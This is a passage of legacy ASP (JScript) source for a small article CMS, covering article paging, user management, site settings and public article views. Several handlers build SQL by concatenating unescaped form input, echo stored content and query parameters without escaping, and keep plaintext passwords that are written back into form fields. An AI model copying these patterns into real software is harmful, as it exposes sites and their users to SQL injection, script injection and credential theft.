while(!rs.eof){%><option value="<%=rs(0)%>"><%=rs(0)%></option>
<%rs.MoveNext();}
rs.Close();%>
</select>
<input name=FenLei value="<%=FenLei%>" size="20"></td></tr>
<tr><td align=center valign=top>detail/content</td><td><textarea name=NeiRong rows=10 cols=40><%=NeiRong%></textarea></td></tr>
<tr><td align=center>auther</td><td>
 <input name=ZuoZhe value="<%=ZuoZhe%>" size="20"></td></tr>
<tr><td align=center>sources</td><td><input name=LaiYuan size=41 value=<%=LaiYuan%>></td></tr>
<tr><td colspan=2 align=center><input type=button value=close onClick="XiuGai.style.display='none'">
<input type=submit value=modify ></td>
</form></tr></table>
</td></tr></table></div><%}
}%><br>
<table cellpadding=0 cellspacing=0 border=1 bordercolor=456789 bordercolordark=white align=center width=770>
<tr><td bgcolor=abcdef align=center valign=top width=210><br>
<p><a href=<%=FileName%>>back home</a></p>
<p>articlemanage</p><%if(Session("Access")=="Admin"){%>
<p><a href=<%=FileName%>?mokuai=user>usermanage</a></p>
<p><a href=<%=FileName%>?mokuai=setting>copyrightsetting</a></p><%}%>
<p><a href=<%=FileName%>?mokuai=logout>logout</a></p>
<br></td><td valign=top>
<table width=97% align=center><tr>
<td valign=bottom>(clicktitlemodify article)</td><td align=right>
<table border style="cursor:hand" width=80 height=30 onClick="WenZhang.style.display='block'">
<tr><td align=center>addarticle</td></tr></table>
</td></tr></table>
<table width=97% align=center border bordercolor=black bordercolordark=white cellpadding=0 cellspacing=0>
<%sql="select BH,BiaoTi,ShanChu from Article order by RiQi DESC";
rs.open(sql,conn,1);
rs.pagesize=17;
page=parseInt(Request.QueryString("yema"));
if(isNaN(page)||page<1) page=1;
if(page>rs.pagecount) page=rs.pagecount;
if(rs.eof){Response.Write("curr , no any article.");}
else{
rs.absolutepage=page;
for(C=0;C<rs.pagesize;C++){%><tr><td>@
<a href=<%=FileName%>?mokuai=manage&caozuo=modify&BH=<%=rs(0)%>><%=rs(1)%></a></td>
<td width=31 align=center><%if(rs(2)==0){%><a href=<%=FileName%>?mokuai=manage&caozuo=delete&BH=<%=rs(0)%>>delete</a><%}
else{%><a href=<%=FileName%>?mokuai=manage&caozuo=huifu&BH=<%=rs(0)%>><font color=green>huifu</font></a><%}%></td></tr>
<%rs.MoveNext();
if(rs.eof) break;}}
pagecount=rs.pagecount;
recordcount=rs.recordcount;
rs.Close();%>
<tr><td height=30 colspan=2> <%if(page>1){%>[<a href=<%=FileName%>?mokuai=manage>index</a>] [<a href=<%=FileName%>?mokuai=manage&yema=<%=page-1%>>上一page</a>] <%}%><%if(page!=pagecount){%>[<a href=<%=FileName%>?mokuai=manage&yema=<%=page+1%>>下一page</a>] [<a href=<%=FileName%>?mokuai=manage&yema=<%=pagecount%>>last</a>] <%}%>jump to 
<select onChange="location.replace('<%=FileName%>?mokuai=manage&yema='+value)">
<%if(pagecount==0) pagecount=1;
for(C=1;C<=pagecount;C++){%><option value=<%Response.Write(C);
if(page==C) Response.Write(" selected")%>><%=C%></option>
<%}%></select>
page.(total <font color=red><%=recordcount%></font> recodes)</td></tr></table>
</td></tr></table>
<div style="position:absolute;display:none;top:expression((document.body.clientHeight-320)/2+body.scrollTop);left:expression((document.body.clientWidth-400)/2)" id=WenZhang>
<table border width=400 border bordercolor=black bordercolordark=white cellpadding=0 cellspacing=0>
<tr bgcolor=000070>
<th align=center height=20><font color=white>addarticle</font></th></tr>
<tr bgcolor=menu><td>
<table><tr>
<form action=<%=FileName%>?mokuai=manage&caozuo=add method=post>
<td width=77 align=center>articletitle</td><td><input size=41 name=BiaoTi></td></tr>
<tr><td align=center>suoshufenlei</td>
<td><select onChange="FenLei.value=value">
<option>selectfenlei</option>
<%sql="Select distinct FenLei from Article where ShanChu=0";
rs.Open(sql,conn);
while(!rs.eof){%><option value="<%=rs(0)%>"><%=rs(0)%></option>
<%rs.MoveNext();}
rs.Close();%>
</select>
<input name=FenLei size="20"></td></tr>
<tr><td align=center valign=top>detail/content</td>
<td><textarea name=NeiRong rows=10 cols=40></textarea></td></tr>
<tr><td align=center>auther</td><td>
 <input name=ZuoZhe value="<%=WangZhan%>" size="20"></td></tr>
<tr><td align=center>sources</td><td><input name=LaiYuan size=41 value=<%=WangZhi%>></td></tr>
<tr><td colspan=2 align=center><input type=button value=close onClick="WenZhang.style.display='none'">
<input type=submit value=add></td>
</form></tr></table>
</td></tr></table></div><%break;
/*********** usermokuai **************/
case "user":
FangFa=Request.Form("TiJiao")+"";
if(FangFa=="add"&&Session("Access")=="Admin"){
sql="Select count(*) from User";
rs.open(sql,conn);
BH=rs(0)+"";
rs.Close();
YongHu=Request.Form("YongHu");
MiMa=Request.Form("MiMa");
QuanXian=Request.Form("QuanXian");
ShanChu=Request.Form("ShanChu");
sql="insert into User values("+BH+",'"+YongHu+"','"+MiMa+"',"+QuanXian+","+ShanChu+")";
conn.Execute(sql);}
response.write (Session("Access"));
if(FangFa=="save"&&Session("Access")=="Admin"){
BH=Request.Form("BH");
YongHu=Request.Form("YongHu");
MiMa=Request.Form("MiMa");
QuanXian=Request.Form("QuanXian");
ShanChu=Request.Form("ShanChu");
sql="update User set YongHu='"+YongHu+"',MiMa='"+MiMa+"',QuanXian="+QuanXian+",ShanChu="+ShanChu+" where BH="+BH;
var a;
conn.Execute (sql,a);
if (a=1){response.write("[[passok]]");response.End;}else{response.write("[[passfail]]");response.End;}
}%><br>
<table cellpadding=0 cellspacing=0 border=1 bordercolor=456789 bordercolordark=white align=center width=770>
<tr><td bgcolor=abcdef align=center width=210><br>
<p><a href=<%=FileName%>>back home</a></p>
<p><a href=<%=FileName%>?mokuai=manage>articlemanage</a></p><%if(Session("Access")=="Admin"){%>
<p>usermanage</p>
<p><a href=<%=FileName%>?mokuai=setting>copyrightsetting</a></p><%}%>
<p><a href=<%=FileName%>?mokuai=login>logout</a></p>
<br></td><td>
<table><tr>
<form action=<%=FileName%>?mokuai=user method=post onSubmit="return confirm('Are You sure to adduser '+YongHu.value+' ？\n\n(added ,and no delete.)')">
<td align=center><h3>usermanage</h3>
user:<input size=10 name=YongHu>
passwd:<input type=password name=MiMa size=10>
<select name=QuanXian><option value=0>commonuser</option>
<option value=1>manager</option></select>
<select name=ShanChu><option value=0>active</option>
<option value=1>deactive</option></select>
<input type=submit value=add name=TiJiao></td>
</form></tr>
<tr height=1 bgcolor=abcdef><td></td></tr><%sql="Select * from User order by BH desc";
if(Session("Access")=="Admin"){
rs.open(sql,conn);
while(!rs.eof){%>
<tr><form action=<%=FileName%>?mokuai=user method=post><input type=hidden name=BH value=<%=rs(0)%>>
<td align=center>user:<input size=10 name=YongHu value=<%=rs(1)%>>
passwd:<input type=password name=MiMa size=10 value=<%=rs(2)%>>
<select name=QuanXian><option value=0>commonuser</option>
<option value=1<%if(rs(3)==1) Response.Write(" selected")%> style="background:abcdef">manager</option></select>
<select name=ShanChu><option value=0>active</option>
<option value=1<%if(rs(4)==1) Response.Write(" selected")%> style="background:fedcba">deactive</option></select>
<input type=submit value=save name=TiJiao></td></form></tr>
<%rs.MoveNext();}
rs.Close();}%></table>
</td></tr></table>
<%break;
/*********** copyrightsetting **************/
case "setting":
TiJiao=Request.Form("TiJiao")+"";
if(Session("Access")=="Admin"&&TiJiao=="save"){
WangZhan=Request.Form("ZhanMing")+"";
WangZhi=Request.Form("WangZhi");
YeTou=Request.Form("YeTou");
YeWei=Request.Form("YeWei");
sql="update Copyright set ZhanMing='"+WangZhan+"',WangZhi='"+WangZhi+"',YeTou='"+YeTou+"',YeWei='"+YeWei+"'";
conn.Execute(sql);
Response.Write("<script>alert(\"savesuccess\")</script>");}%><br>
<table cellpadding=0 cellspacing=0 border=1 bordercolor=456789 bordercolordark=white align=center width=770>
<tr><td bgcolor=abcdef align=center width=210><br>
<p><a href=<%=FileName%>>back home</a></p>
<p><a href=<%=FileName%>?mokuai=manage>articlemanage</a></p><%if(Session("Access")=="Admin"){%>
<p><a href=<%=FileName%>?mokuai=user>usermanage</a></p>
<p>copyrightsetting</p><%}%>
<p><a href=<%=FileName%>?mokuai=login>logout</a></p>
<br></td><td>
<table><tr>
<form action=<%=FileName%>?mokuai=setting method=post>
<td align=center><h3>copyrightsetting</h3>
site name:<input size=15 name=ZhanMing value=<%=WangZhan%>>
address:<input name=WangZhi value=<%=WangZhi%> size=30><br>
YeTou:<textarea name=YeTou rows=10 cols=40><%=YeTou%></textarea><br>
YeWei:<textarea  name=YeWei rows=10 cols=40><%=YeWei%></textarea><br>
<input type=submit value=save name=TiJiao></td>
</form></tr></table>
</td></tr></table>
<%break;
/*********** default **************/
default:
ID=parseInt(Request.QueryString("ID"));
if(!isNaN(ID)){%><br>
<%sql="select * from Article where ShanChu=0 and BH="+ID;
rs.Open(sql,conn);
if(!rs.eof){sql="update Article set DianJi=DianJi+1 where BH="+ID;
conn.Execute(sql);%><h2 class="title"><%=rs(1)%></h2>
<center><b>date:</b><%=rs(5)%><br>
<b></b><a href=<%=rs(4)%>><%=rs(3)%></a></center>
<p><%=rs(2)%></p><%}
else{Response.Write("<center>error: can't find this ID, or This file was deleted.</center>");}
FenLei=""+rs(7);
rs.Close();%>
</div>
                                </div>
                                        </div>
                                    </div>
                                            </div> 
                                               
<%}
else{%><br><table width=770 align=center cellpadding=0 cellspacing=0>
<tr><%FenLei=Request.QueryString("fenlei")+"";
FenLei=FenLei.replace(/'/g,"''");
if(FenLei!="undefined"){FenLei=" and FenLei='"+FenLei+"'";}
else{FenLei="";}%><!--list-contentstart-->
<b><%if(Request.QueryString("fenlei")+""!="undefined"){%><%=Request.QueryString("fenlei")%><%}
else{%>HOME<%}%></b></td></tr>
<tr><td><br><ul type=1><%Keyword=Request.QueryString("guanjianci")+"";
Keyword=Keyword.replace(/'/g,"''");
if(Keyword=="undefined"){Rule="";}
else{Rule=" and(BiaoTi like '%"+Keyword+"%' or NeiRong like '%"+Keyword+"%')";}
sql="select FenLei,BiaoTi,BH,RiQi,DianJi,LaiYuan,NeiRong from Article where ShanChu=0"+FenLei+Rule+" order by RiQi DESC";
rs.Open(sql,conn,1);
rs.pagesize=27;
page=parseInt(Request.QueryString("yema"));
if(isNaN(page)||page<1) page=1;
if(page>rs.pagecount) page=rs.pagecount;
if(rs.eof){Response.Write("Not found !.");}
else{rs.absolutepage=page;
for(C=0;C<rs.pagesize;C++){
FenLei=Request.QueryString("fenlei")+"";
FenLei=FenLei.replace(/'/g,"''");
if(FenLei=="undefined"){FenLei="["+(rs(0)+"").link(FileName+"?fenlei="+rs(0))+"] ";}
else{FenLei="";}
	%>
<div class="node">
  												<h2 class="title"><%=(""+rs(1)).link(""+rs(5))%></h2>
        										<div class="content"><%=rs(6)%>
                                                </div>
                                                <div class="clear-block clear"></div>
												<div class="links">
                                                	<ul class="links inline">
                                                    	<li class="blog_usernames_blog first"><%=FenLei%></li>
														<li class="node_read_more last"><%="Read more".link(FileName+"?ID="+rs(2))%></li>
                                                    </ul>
                                                </div>  
                                            </div>
<%
/*Response.Write("<li>"+FenLei+(""+rs(1)).link(FileName+"?ID="+rs(2))+"(<a href="+rs(5)+">"+rs(5)+"</a> "+(""+rs(3)).fontcolor("456789")+" "+(""+rs(4)).fontcolor("green")+")</li>");*/
/*Response.Write("<li>"+FenLei+(""+rs(1)).link(""+rs(5))+"("+"detail".link(FileName+"?ID="+rs(2))+(""+rs(3)).fontcolor("456789")+" "+(""+rs(4)).fontcolor("green")+")<br>"+(""+rs(6))+"</li>");*/
rs.MoveNext();
if(rs.eof) break;}}
pagecount=parseInt(rs.pagecount);
recordcount=parseInt(rs.recordcount);
rs.Close();%></ul></td></tr>
<tr><td height=30> <%FenLei=Request.QueryString("fenlei")+"";
if(page>1){%>[<a href="<%=FileName%><%if(FenLei!="undefined") Response.Write("?fenlei="+FenLei);if(Keyword!="undefined"){if(FenLei=="undefined"){Response.Write("?");}else{Response.Write("&");}Response.Write("guanjianci="+Keyword);}%>">index</a>] [<a href="<%=FileName%>?yema=<%=page-1%><%if(FenLei!="undefined") Response.Write("&fenlei="+FenLei);if(Keyword!="undefined") Response.Write("&guanjianci="+Keyword);%>">上一page</a>] <%}%><%if(page!=pagecount){%>[<a href="<%=FileName%>?yema=<%=page+1%><%if(FenLei!="undefined") Response.Write("&fenlei="+FenLei);if(Keyword!="undefined") Response.Write("&guanjianci="+Keyword);%>">下一page</a>] [<a href="<%=FileName%>?yema=<%=pagecount%><%if(FenLei!="undefined") Response.Write("&fenlei="+FenLei);if(Keyword!="undefined") Response.Write("&guanjianci="+Keyword);%>">last</a>] <%}%>jump to 
<select onChange="location.replace('<%=FileName%>?yema='+value<%if(FenLei!="undefined"||Keyword!="undefined") Response.Write("+'");
if(FenLei!="undefined") Response.Write("&fenlei="+FenLei);
if(Keyword!="undefined") Response.Write("&guanjianci="+Keyword);
if(FenLei!="undefined"||Keyword!="undefined") Response.Write("'");%>)">
<%if(pagecount<1) pagecount=1;
for(C=1;C<=pagecount;C++){%><option value=<%Response.Write(C);
if(page==C) Response.Write(" selected")%>><%=C%></option>
<%}%></select>
page.(total <font color=red><%=recordcount%></font> recodes)</ul>
                                </div>

<%}
if(!isNaN(ID)){%>
                       		<div id="sidebar-right">
                            	<div class="block block-menu" id="block-menu-menu-workshops">
  									<h2 class="title">Hot Article </h2>  
                                    	<div class="content">
                                        	<ul class="menu"><%sql="select top 7 BH,BiaoTi,RiQi,DianJi,LaiYuan from Article where ShanChu=0 and FenLei='"+FenLei+"' order by DianJi DESC";
rs.Open(sql,conn);
C=0;
while(!rs.eof&&C<7){%>
<li><a href=<%=rs(4)%>><%=rs(1)%></a> <a href=<%=FileName%>?ID=<%=rs(0)%>>detail</a>
(<font color=green><%=rs(2)%></font>
<font color=red><%=rs(3)%></font>)</li><%C++;
rs.MoveNext();}
rs.Close();%>
                                            </ul>
                                            <h2 class="title"> Relearticle </h2> 
                                            <ul class="menu"><%sql="select top 7 BH,BiaoTi,RiQi,DianJi,LaiYuan from Article where ShanChu=0 and FenLei='"+FenLei+"' order by RiQi DESC";
rs.Open(sql,conn);
C=0;
while(!rs.eof&&C<7){%>
<li><a href=<%=rs(4)%>><%=rs(1)%></a> <a href=<%=FileName%>?ID=<%=rs(0)%>>detail</a>
(<font color=green><%=rs(2)%></font>
<font color=red><%=rs(3)%></font>)</li><%C++;
rs.MoveNext();}
rs.Close();%>
                                            </ul>
                                        </div>

<%}
}%> 
                                    </div>
                                </div>
                  			</div>
    						<div style="clear:both"></div>
                            <div style="clear:both"></div>
                            </div>
</body></html><%conn.Close();
delete rs;
delete conn;
%>